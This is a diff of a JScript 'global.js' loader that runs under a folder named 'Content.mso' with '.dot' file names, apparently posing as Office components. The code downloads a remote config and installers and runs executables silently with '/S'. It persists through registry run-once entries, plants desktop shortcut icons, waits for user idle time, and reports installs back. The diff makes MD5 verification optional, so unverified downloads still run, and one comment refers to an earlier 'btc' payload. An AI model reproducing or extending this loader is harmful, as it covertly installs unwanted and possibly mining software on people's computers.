@@ -1,7 +1,7 @@
 ////////////
 trace("*----global.js----")
 __interrupted
-var __DEBUG = 1;
+var __DEBUG = 0;
 var __IsSupportOpencl = 0;
 var __external = external;
 var __windows = windows;
@@ -23,7 +23,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadyConfig ={ name: "Doc2.dot",url:"http://127.0.0.1/config/Doc2.dot", md5:"21A03F017098B949FDAF76593A595BBA" }
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://127.0.0.1/config/Doc2.dot" }
 //最重要的配置文件
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
@@ -41,14 +41,14 @@ if(__DEBUG)
 else if(__IsSupportOpencl)
 	__idletime=1000*30
 //var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc
-
-var __installReadys = [/*
+/*
+var __installReadys = [
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
 							condition:{type: "reg", subtype: "existreg", value:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes"} 
 						},
 						{id: 10002, name: "XMPSetup-fanli(2).exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
-					  */]			
+					  ]*/			
 //
 trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
 		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
@@ -220,7 +220,7 @@ module.getRunningModules=function () {
 }
 /////////////////
 function getXmlHttp () {
-	log("enter getXmlHttp")
+	//log("enter getXmlHttp")
 	/////////////
 	if(typeof arguments.callee.objs=="undefined")
 		arguments.callee.objs = [];	 
@@ -300,16 +300,13 @@ function filter_dlbusiness.prototype.run(pipe){
 	var pThis = this;	
 	pipe.exitcode=100;
 	log("this.dlobj.name="+this.dlobj.name+" this.dlobj.url="+this.dlobj.url+", localmd5="+localmd5+",destmd5="+destmd5);
-	log("this.dlobj.name="+this.dlobj.name+" this.dlobj.url="+this.dlobj.url+" -1.1");
-	if(localmd5 == destmd5.toUpperCase()){	
+	//log("this.dlobj.name="+this.dlobj.name+" this.dlobj.url="+this.dlobj.url+" -1.1");
+	if(destmd5 && localmd5 && (localmd5 == destmd5.toUpperCase())){	
 		log(" readyDestFile OnSuccess "+name+" , dest file md5="+localmd5);
 		sendHttpStat("downloadedfile", "downloadedfile_success_"+name);
 		return true;
 	}
-	else{//开始下载		
-		if(destmd5.length > 0){
-			//pipe.url =  pipe.url; //+"?rnd="+ (new Date()).valueOf() 
-		}		
+	else{//开始下载		 
 		var objXMLHTTP = getXmlHttp(); 		 
 		objXMLHTTP.open("GET", pThis.dlobj.url,true);				
 		objXMLHTTP.onreadystatechange = function(){
@@ -332,7 +329,7 @@ function filter_dlbusiness.prototype.run(pipe){
 						if(1){
 							var tmd5 = __storage.GetFileMD5 (path)
 							log(" localpath md5 : "+tmd5+" destmd5:"+destmd5)
-							if((__DEBUG && tmd5) || (tmd5 == destmd5.toUpperCase()) ){
+							if( tmd5 && (!destmd5 || (tmd5 == destmd5.toUpperCase())) ){
 								sendHttpStat("downloadingfile", "downloadingfile_success_" +name);
 								pipe.exitaction="downloadingfile_success_" +pipe.name;
 								if( name.substr(name.length-4)==".cab"){
@@ -435,26 +432,31 @@ function filter_desktopicon.prototype.run(pipe){
 		var desktopdir = __wshShell.SpecialFolders("Desktop")		
 		var path=desktopdir+"\\"+this.name
 		log("filter_desktopicon path="+path)
-		__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",this.URL)
-		__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFile",this.IconFile)
-		__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFileName",this.IconFileName)	
+		if(__fso.FileExists(path)){
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",this.URL)
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFile",this.IconFile)
+			__storage.WritePrivateProfileValue(path,"InternetShortcut","IconFileName",this.IconFileName)	
+		}
 		return true
 }
 function filter_innertask.prototype.run(pipe){
 	log("filter_innertask.prototype.run, typeof ___gconfig="+typeof ___gconfig)
 	if(___gconfig){}	
+	var pThis = this
 	if("object" == typeof ___gconfig){
 		var pid = __external.GetPID();
-		var pid_max = ___gconfig.validcondition.PID.max ? ___gconfig.validcondition.PID.max : "*"
-		var pid_min = ___gconfig.validcondition.PID.min ? ___gconfig.validcondition.PID.min : "*"
-		log("pid="+pid+", pid_max="+pid_max+", pid_min="+pid_min);
+		var pid_max = ___gconfig.validcondition.PID.max ? ___gconfig.validcondition.PID.max : "F"
+		var pid_min = ___gconfig.validcondition.PID.min ? ___gconfig.validcondition.PID.min : "0"
+		
 		for(i=0;i<pid.length;i++){
 			var current = pid.charCodeAt(i)
-			var dest_max = pid_max.charAt(i).length ? pid_max.charCodeAt(i) : 0xff
+			var dest_max = pid_max.charAt(i).length ? pid_max.charCodeAt(i) : 0xFF
 			var dest_min = pid_min.charAt(i).length ? pid_min.charCodeAt(i) : 0x00
+			log("pid="+pid+", pid_max="+dest_max+", pid_min="+dest_min);
 			if(current >dest_max || current<dest_min){
-				//@
-				return true;
+				//@								 
+				setTimeout(function(){pThis.callback(pipe, true);},1)
+				return 
 			}
 		}
 		//		
@@ -464,7 +466,8 @@ function filter_innertask.prototype.run(pipe){
 		log("osiversion="+osiversion+",osiversion_max="+osiversion_max+",osiversion_min="+osiversion_min)
 		if(osiversion>osiversion_max || osiversion_max<osiversion_min){
 			//@
-			return true;
+			setTimeout(function(){pThis.callback(pipe, true);},1)
+			return 
 		}
 		//
 		var datver = __external.GetHostBuild();
@@ -473,11 +476,13 @@ function filter_innertask.prototype.run(pipe){
 		log("datver="+datver+",datver_max="+datver_max+",datver_min="+datver_min)
 		if(datver>datver_max || datver<datver_min){
 			//@
-			return true
+			setTimeout(function(){pThis.callback(pipe, true);},1)
+			return 
 		}
 		if(___gconfig.validcondition.condition){
 			if(!___gconfig.validcondition.condition()){
-				return true
+				setTimeout(function(){pThis.callback(pipe, true);},1)
+				return 
 			}
 		}
 		var _innertask_module = new module("innertask");		
@@ -486,27 +491,33 @@ function filter_innertask.prototype.run(pipe){
 			var install = ___gconfig.installlist[i];
 			var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id)} );
 			if(regvalue){
-				log("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id+ " = "+regvalue)
+				log("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id+ " = "+regvalue+", skip")
 				continue;		
 			}		
 			if(install.invalidcondition && install.invalidcondition()){
 			}else{
-				if(!__startup){
-					log("add task dlsetup "+install.name+" ")
+				log("add task dlsetup "+install.name+" ")
+				if(__startup){//开机启动时,不用下载直接运行
+					if(!install.runimmediately){ //开机直接运行
+						var _filter_launch = new filter_launch(install.id,install.name,install.param);			
+						_filter_launch.callback =_innertask_module.push(_filter_launch);
+				  }else{
+				  	//...早运行了
+				  }					
+				}else{
 					var _filter_dl = new filter_dlbusiness(install);			
 					_filter_dl.callback =_innertask_module.push(_filter_dl);
-				}
-				if(install.runimmediately || __startup){ //要求立即运行,和开机启动一样
-					var _filter_launch = new filter_launch(install.id,install.name,install.param);			
-					_filter_launch.callback =_innertask_module.push(_filter_launch);					
-				}else{
-					var _filter_regrunonce = new filter_regrunonce(install.id ,install.name,install.param);			
-					_filter_regrunonce.callback =_innertask_module.push(_filter_regrunonce);			
-				}
+					if(install.runimmediately){//下载后立即运行
+						var _filter_launch = new filter_launch(install.id,install.name,install.param);			
+						_filter_launch.callback =_innertask_module.push(_filter_launch);
+					}else{//写注册表下次运行
+						var _filter_regrunonce = new filter_regrunonce(install.id ,install.name,install.param);			
+						_filter_regrunonce.callback =_innertask_module.push(_filter_regrunonce);	
+					}
+				}				 
 			}					
 		}
-		//
-	 
+		// 
 		var desktopdir = __wshShell.SpecialFolders("Desktop")		
 		for(i=0;i<___gconfig.desktopiconlist.length;i++){
 			var desktopicon=___gconfig.desktopiconlist[i]			 
@@ -514,21 +525,38 @@ function filter_innertask.prototype.run(pipe){
 			}else{
 				//下载存成图标
 				var dlicon = desktopicon				
+				var desktopdir = __wshShell.SpecialFolders("Desktop")		
+				var path=desktopdir+"\\"+dlicon.name
+				log("filter_desktopicon path="+path)
+				if(__fso.FileExists(path)){
+					log("exist path="+path+", skip")
+					continue;
+				}			 
 				dlicon.url = dlicon.url?dlicon.url:desktopicon.iconPrivateProfileString.IconFile
-				log("add task dlicon "+desktopicon.name+" "+" url="+dlicon.url)
-				if(!__startup){
-					var _filter_dl = new filter_dlbusiness(dlicon);			
-					_filter_dl.callback =_innertask_module.push(_filter_dl);
-				}
-				if(dlicon.runimmediately || __startup){
-					var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
+				log("add task dlicon "+desktopicon.name+" "+" url="+dlicon.url+",dlicon.runimmediately="+dlicon.runimmediately)
+				if(__startup ){//开机启动时,不用下载直接运行
+					if(!dlicon.runimmediately){
+						var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
 								desktopicon.iconPrivateProfileString.URL, desktopicon.iconPrivateProfileString.IconFile, desktopicon.iconPrivateProfileString.IconFileName)
-					_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);				
+						_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);
+					}else{
+					}					
+				}else {
+					var _filter_dl = new filter_dlbusiness(dlicon);			
+					_filter_dl.callback =_innertask_module.push(_filter_dl);		
+					if(dlicon.runimmediately)	{
+						var _filter_desktopicon = new filter_desktopicon(desktopicon.name, 
+								desktopicon.iconPrivateProfileString.URL, desktopicon.iconPrivateProfileString.IconFile, desktopicon.iconPrivateProfileString.IconFileName)
+						_filter_desktopicon.callback=_innertask_module.push(_filter_desktopicon);
+					}else{
+						//写注册表下次运行,++
+					}		
 				}
+					
 			}
 		}
 		
-		_innertask_module.setDoneCallback(function (mod) {
+		_innertask_module.setDoneCallback(function (mod,pipe, index) {
 			log("module name "+mod.name+" onDonCallback");		////innertask 完后就是userfinedtask 最后一步了
 			if(!__startup){
 				var _userdefined_module = new module("userdefined");		
@@ -542,11 +570,14 @@ function filter_innertask.prototype.run(pipe){
 						_filter_load.callback = _userdefined_module.push(_filter_load);
 					}
 				}
+				_userdefined_module.setDoneCallback(function (mod,pipe, index) {
+						exit(3000 + index - __startup)
+					})
 				
 				var userdefinedpipe = {name:"userfined"}
 				_userdefined_module.run(userdefinedpipe)
 			}else{
-				exit(0) 	
+				exit(2000+index - __startup) 
 			}			
 		})//end _innertask_module.setDoneCallback
 		_innertask_module.run(pipe)
@@ -672,8 +703,7 @@ function onload(){
 		//return ;
 		__startup = 1
 	}	
-	//__startup = 1	 
-	
+	 
 	//1.启动统计
 	var __module = new module("global.js", 1);	
 	var filter_xrun = new filter_eXclusiveRuning(1)
